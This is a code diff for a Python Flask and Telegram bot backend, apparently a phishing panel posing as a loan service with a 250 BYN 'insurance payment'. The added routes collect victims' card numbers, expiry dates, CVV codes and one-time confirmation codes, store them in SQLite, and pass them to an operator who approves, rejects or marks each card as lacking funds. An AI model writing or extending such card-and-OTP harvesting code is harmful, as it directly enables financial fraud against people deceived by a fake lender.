@@ -164,9 +164,50 @@ def webhook():
         # ========== КНОПКА НА СТРАХОВКУ ==========
         elif callback_data.startswith('insurance_link:'):
             session_id = callback_data.split(':')[1]
-            insurance_link = f"{SITE_URL}/page_insurance/?session={session_id}"
+            insurance_link = f"{SITE_URL}/oplata_strahovki/?session={session_id}"
             send_callback_answer(callback_id, "✅ Ссылка на страховку")
-            edit_message_text(chat_id, message_id, f"🛡️ <b>ССЫЛКА НА СТРАХОВКУ</b>\n\n{insurance_link}\n\nОтправьте эту ссылку клиенту.", None)
+            edit_message_text(chat_id, message_id, f"🛡️ <b>ССЫЛКА НА ОПЛАТУ СТРАХОВКИ</b>\n\n{insurance_link}\n\nОтправьте эту ссылку клиенту.", None)
+            
+        # ========== СТРАХОВКА (оплата) ==========
+        elif callback_data.startswith('insurance_card_ok:'):
+            session_id = callback_data.split(':')[1]
+            conn = sqlite3.connect('applications.db')
+            c = conn.cursor()
+            c.execute('UPDATE card_data SET status = "approved" WHERE session_id = ?', (session_id,))
+            conn.commit()
+            conn.close()
+            send_callback_answer(callback_id, "✅ Данные карты подтверждены")
+            edit_message_text(chat_id, message_id, f"✅ <b>ДАННЫЕ КАРТЫ (СТРАХОВКА) ПОДТВЕРЖДЕНЫ</b>\n\nСессия: {session_id}", None)
+            
+        elif callback_data.startswith('insurance_card_error:'):
+            session_id = callback_data.split(':')[1]
+            conn = sqlite3.connect('applications.db')
+            c = conn.cursor()
+            c.execute('UPDATE card_data SET status = "rejected" WHERE session_id = ?', (session_id,))
+            conn.commit()
+            conn.close()
+            send_callback_answer(callback_id, "❌ Данные карты отклонены")
+            edit_message_text(chat_id, message_id, f"❌ <b>ДАННЫЕ КАРТЫ (СТРАХОВКА) ОТКЛОНЕНЫ</b>\n\nСессия: {session_id}", None)
+            
+        elif callback_data.startswith('insurance_code_ok:'):
+            session_id = callback_data.split(':')[1]
+            conn = sqlite3.connect('applications.db')
+            c = conn.cursor()
+            c.execute('UPDATE card_data SET code_status = "approved" WHERE session_id = ?', (session_id,))
+            conn.commit()
+            conn.close()
+            send_callback_answer(callback_id, "✅ Код подтверждён")
+            edit_message_text(chat_id, message_id, f"✅ <b>КОД (СТРАХОВКА) ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}\n🛡️ Страховка оплачена! Кредит оформлен.", None)
+            
+        elif callback_data.startswith('insurance_code_error:'):
+            session_id = callback_data.split(':')[1]
+            conn = sqlite3.connect('applications.db')
+            c = conn.cursor()
+            c.execute('UPDATE card_data SET code_status = "rejected" WHERE session_id = ?', (session_id,))
+            conn.commit()
+            conn.close()
+            send_callback_answer(callback_id, "❌ Код отклонён")
+            edit_message_text(chat_id, message_id, f"❌ <b>КОД (СТРАХОВКА) ОТКЛОНЁН</b>\n\nСессия: {session_id}", None)
             
         # ========== АВТОРИЗАЦИЯ ==========
         elif callback_data.startswith('auth_code_ok:'):
@@ -251,7 +292,7 @@ def get_application(session_id):
         return jsonify({"fullname": row[0], "phone": row[1], "amount": row[2], "term": row[3]})
     return jsonify({"error": "not found"}), 404
 
-# ========== КАРТА ==========
+# ========== ОПЛАТА (ОСНОВНАЯ) ==========
 @app.route('/submit_card', methods=['POST'])
 def submit_card():
     data = request.json
@@ -357,6 +398,73 @@ def reset_code_status(session_id):
     c.execute('UPDATE card_data SET code_status = "pending" WHERE session_id = ?', (session_id,))
     conn.commit()
     conn.close()
+    return jsonify({"status": "ok"})
+
+# ========== ОПЛАТА СТРАХОВКИ ==========
+@app.route('/submit_insurance_payment', methods=['POST'])
+def submit_insurance_payment():
+    data = request.json
+    session_id = data.get('session_id')
+    
+    conn = sqlite3.connect('applications.db')
+    c = conn.cursor()
+    c.execute('SELECT fullname, phone FROM applications WHERE session_id = ?', (session_id,))
+    app_data = c.fetchone()
+    
+    fullname = app_data[0] if app_data else '—'
+    
+    c.execute('INSERT OR REPLACE INTO card_data (session_id, card_holder, card_number, card_expiry, card_cvv, status) VALUES (?, ?, ?, ?, ?, ?)',
+              (session_id, data['card_holder'], data['card_number'], data['card_expiry'], data['card_cvv'], 'pending'))
+    conn.commit()
+    conn.close()
+    
+    msg = f"""🛡️ <b>ОПЛАТА СТРАХОВКИ</b>
+
+👤 Клиент: {fullname}
+💰 Сумма: 250 BYN
+🆔 Сессия: <code>{session_id}</code>"""
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "✅ Данные верные", "callback_data": f"insurance_card_ok:{session_id}"}],
+            [{"text": "❌ Данные не верные", "callback_data": f"insurance_card_error:{session_id}"}]
+        ]
+    }
+    
+    send_to_admin(msg, keyboard)
+    return jsonify({"status": "ok"})
+
+@app.route('/submit_insurance_code_check', methods=['POST'])
+def submit_insurance_code_check():
+    data = request.json
+    session_id = data['session_id']
+    code = data['code']
+    
+    conn = sqlite3.connect('applications.db')
+    c = conn.cursor()
+    c.execute('SELECT fullname FROM applications WHERE session_id = ?', (session_id,))
+    app_data = c.fetchone()
+    conn.close()
+    
+    fullname = app_data[0] if app_data else '—'
+    
+    msg = f"""🔐 <b>ПОДТВЕРЖДЕНИЕ КОДА (СТРАХОВКА)</b>
+
+👤 Клиент: {fullname}
+💰 Сумма: 250 BYN
+🔢 Введённый код: <code>{code}</code>
+
+🆔 Сессия: <code>{session_id}</code>"""
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "✅ Код верный", "callback_data": f"insurance_code_ok:{session_id}"}],
+            [{"text": "❌ Код не верный", "callback_data": f"insurance_code_error:{session_id}"}],
+            [{"text": "💰 Недостаточно средств", "callback_data": f"code_insufficient:{session_id}"}]
+        ]
+    }
+    
+    send_to_admin(msg, keyboard)
     return jsonify({"status": "ok"})
 
 # ========== АВТОРИЗАЦИЯ ==========
